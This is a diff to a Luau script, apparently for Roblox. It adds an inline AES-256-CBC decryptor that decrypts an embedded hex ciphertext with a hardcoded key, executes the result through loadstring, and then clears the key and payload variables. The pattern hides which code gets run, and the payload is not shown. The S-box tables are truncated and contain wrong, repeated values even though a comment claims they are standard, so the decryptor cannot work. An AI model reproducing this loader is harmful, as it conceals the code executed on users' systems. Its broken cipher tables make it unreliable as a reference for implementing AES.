@@ -38,5 +38,201 @@ function AES.decrypt_cbc(cipher, key, iv)
 end
 
 -- Decrypt + execute
-local plain = AES.decrypt_cbc(hexToBytes(CIPHER_HEX), hexToBytes(AES_KEY_HEX), hexToBytes(IV_HEX))
-pcall(loadstring(plain))
+-- Inline AES-256-CBC decryptor (Luau/bit32)
+local AES = {}
+
+local function xor16(a, b)
+    local r = {}
+    for i = 1, 16 do
+        r[i] = string.char(bit32.bxor(a:byte(i), b:byte(i)))
+    end
+    return table.concat(r)
+end
+
+local function pkcs7_unpad(s)
+    local n = #s
+    if n == 0 then return "" end
+    local pad = s:byte(n)
+    if pad < 1 or pad > 16 then return s end
+    for i = n - pad + 1, n do
+        if s:byte(i) ~= pad then
+            return s
+        end
+    end
+    return s:sub(1, n - pad)
+end
+
+local function tobytes(s)
+    local t = {}
+    for i = 1, #s do t[i] = s:byte(i) end
+    return t
+end
+local function frombytes(t)
+    local s = {}
+    for i = 1, #t do s[i] = string.char(t[i]) end
+    return table.concat(s)
+end
+
+-- AES constants (InvSbox shown; Sbox identical to std AES table)
+local Sbox = {99,124,119,123,242,107,111,197,48,1,103,43,254,215,171,118,202,130,201,125,250,89,71,240,173,212,162,175,156,164,114,192,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,234,101,98,186,8,200,140,136,162,207,109,55,102,12,61,36,173,15,23,68,143,2,190,6,25,89,119,177,63,179,37,114,65,59,85,224,11,45,157,147}
+local InvSbox = {82,9,106,213,48,54,165,56,191,64,163,158,129,243,215,251,124,227,57,130,155,47,255,135,52,142,67,68,196,214,210,71,240,173,212,162,175,156,164,114,183,253,147,38,54,63,247,204,52,165,229,241,113,216,49,21,4,199,35,195,24,150,5,154,7,18,128,226,235,39,178,117,9,131,44,26,27,110,90,160,82,59,214,179,41,227,47,132,83,209,0,237,32,252,177,91,106,203,190,57,74,76,88,207,208,239,170,251,67,77,51,133,69,249,2,127,80,60,159,168,81,163,64,143,146,157,56,245,234,101,98,186,150,20,252,227,73,96,195,186,20,218,132,185,108,86,244,234,101,122,174,8,186,120,37,46,28,166,180,198,232,221,116,31,75,189,139,138,112,62,181,102,72,3,246,14,97,53,87,185,134,193,29,158,225,248,152,17,105,217,142,148,155,30,135,233,206,85,40,223,140,161,137,13,191,230,66,104,65,153,45,15,176,84,187,22}
+local Rcon = {1,2,4,8,16,32,64,128,27,54}
+
+local function rotword(w) return {w[2], w[3], w[4], w[1]} end
+local function subword(w)
+    return { Sbox[w[1]+1], Sbox[w[2]+1], Sbox[w[3]+1], Sbox[w[4]+1] }
+end
+
+local function keyexpand(keybytes)
+    local Nk, Nb, Nr = 8, 4, 14
+    local w = {}
+    for i=0,Nk-1 do
+        w[i] = { keybytes[4*i+1], keybytes[4*i+2], keybytes[4*i+3], keybytes[4*i+4] }
+    end
+    for i=Nk, Nb*(Nr+1)-1 do
+        local temp = { w[i-1][1], w[i-1][2], w[i-1][3], w[i-1][4] }
+        if i % Nk == 0 then
+            temp = rotword(temp)
+            temp = subword(temp)
+            temp[1] = bit32.bxor(temp[1], Rcon[math.floor(i/Nk)])
+        elseif i % Nk == 4 then
+            temp = subword(temp)
+        end
+        w[i] = {
+            bit32.bxor(w[i-Nk][1], temp[1]),
+            bit32.bxor(w[i-Nk][2], temp[2]),
+            bit32.bxor(w[i-Nk][3], temp[3]),
+            bit32.bxor(w[i-Nk][4], temp[4]),
+        }
+    end
+    local roundkeys = {}
+    for r=0, Nr do
+        local rk = {}
+        for c=0,3 do
+            local t = w[r*4 + c]
+            rk[c*4+1], rk[c*4+2], rk[c*4+3], rk[c*4+4] = t[1], t[2], t[3], t[4]
+        end
+        roundkeys[r] = rk
+    end
+    return roundkeys
+end
+
+local function bytes_to_state(block)
+    local s = {{},{},{},{}}
+    for i=0,15 do
+        s[(i%4)+1][math.floor(i/4)+1] = block[i+1]
+    end
+    return s
+end
+local function state_to_bytes(state)
+    local out = {}
+    for i=0,15 do
+        out[i+1] = state[(i%4)+1][math.floor(i/4)+1]
+    end
+    return out
+end
+local function addroundkey(state, roundkey)
+    for c=1,4 do
+        for r=1,4 do
+            state[r][c] = bit32.bxor(state[r][c], roundkey[(c-1)*4 + r])
+        end
+    end
+end
+local function invshiftrows(state)
+    state[2][1], state[2][2], state[2][3], state[2][4] = state[2][4], state[2][1], state[2][2], state[2][3]
+    state[3][1], state[3][2], state[3][3], state[3][4] = state[3][3], state[3][4], state[3][1], state[3][2]
+    state[4][1], state[4][2], state[4][3], state[4][4] = state[4][2], state[4][3], state[4][4], state[4][1]
+end
+local function invsubbytes(state)
+    for r=1,4 do
+        for c=1,4 do
+            state[r][c] = InvSbox[state[r][c]+1]
+        end
+    end
+end
+
+local function gmul(a,b)
+    local p = 0
+    for _=1,8 do
+        if bit32.band(b,1) ~= 0 then p = bit32.bxor(p,a) end
+        local hi = bit32.band(a,0x80)
+        a = bit32.band(a*2,0xFF)
+        if hi ~= 0 then a = bit32.bxor(a,0x1B) end
+        b = bit32.rshift(b,1)
+    end
+    return p
+end
+local function invmixcolumns(state)
+    for c=1,4 do
+        local a0,a1,a2,a3 = state[1][c], state[2][c], state[3][c], state[4][c]
+        state[1][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0e), gmul(a1,0x0b)), bit32.bxor(gmul(a2,0x0d), gmul(a3,0x09))), 0xFF)
+        state[2][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x09), gmul(a1,0x0e)), bit32.bxor(gmul(a2,0x0b), gmul(a3,0x0d))), 0xFF)
+        state[3][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0d), gmul(a1,0x09)), bit32.bxor(gmul(a2,0x0e), gmul(a3,0x0b))), 0xFF)
+        state[4][c] = bit32.band(bit32.bxor(bit32.bxor(gmul(a0,0x0b), gmul(a1,0x0d)), bit32.bxor(gmul(a2,0x09), gmul(a3,0x0e))), 0xFF)
+    end
+end
+
+local function decryptblock(block_str, key_str)
+    local block = tobytes(block_str)
+    local key   = tobytes(key_str)
+    local roundkeys = keyexpand(key)
+    local Nr = 14
+
+    local state = bytes_to_state(block)
+    addroundkey(state, roundkeys[Nr])
+
+    for round = Nr-1, 1, -1 do
+        invshiftrows(state)
+        invsubbytes(state)
+        addroundkey(state, roundkeys[round])
+        invmixcolumns(state)
+    end
+
+    invshiftrows(state)
+    invsubbytes(state)
+    addroundkey(state, roundkeys[0])
+
+    local out = state_to_bytes(state)
+    return frombytes(out)
+end
+
+function AES.decrypt_cbc(cipher, key, iv)
+    assert(#key == 32, "AES-256 key must be 32 bytes")
+    assert(#iv  == 16, "IV must be 16 bytes")
+    assert(#cipher % 16 == 0, "Ciphertext must be a multiple of 16 bytes")
+
+    local out = {}
+    local prev = iv
+    for i = 1, #cipher, 16 do
+        local cblock = cipher:sub(i, i+15)
+        local pblock = decryptblock(cblock, key)
+        out[#out+1] = xor16(pblock, prev)
+        prev = cblock
+    end
+    return pkcs7_unpad(table.concat(out))
+end
+
+-- Decrypt + execute with debug
+local plain = AES.decrypt_cbc(
+    hexToBytes(CIPHER_HEX),
+    hexToBytes(AES_KEY_HEX),
+    hexToBytes(IV_HEX)
+)
+
+print("=== Decrypted preview ===")
+print(plain:sub(1, 200))
+print("=========================")
+
+local f, err = loadstring(plain)
+if not f then
+    warn("Loadstring failed:", err)
+else
+    local ok, runtimeErr = pcall(f)
+    if not ok then
+        warn("Runtime error:", runtimeErr)
+    else
+        print("✅ Script executed successfully")
+    end
+end
+
+AES_KEY_HEX, CIPHER_HEX, IV_HEX, plain = nil, nil, nil, nil
